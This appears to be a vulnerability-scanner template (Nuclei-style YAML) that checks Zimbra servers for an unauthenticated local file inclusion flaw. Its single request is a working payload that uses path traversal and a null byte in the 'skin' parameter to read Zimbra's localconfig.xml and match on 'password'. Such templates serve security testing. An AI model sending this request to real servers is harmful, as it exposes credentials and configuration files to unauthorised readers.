id: zimbra-unauthenticated-lfi

info:
  name: Zimbra (2009-2013) - LFI
  author: rubina119
  severity: critical
  description: A vulnerability in Zimbra allows unauthenticated remote attackers to read files on the server.
  reference:
    - https://www.exploit-db.com/exploits/30085
  tags: zimbra,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00"
    matchers:
      - type: regex
        regex:
          - "password"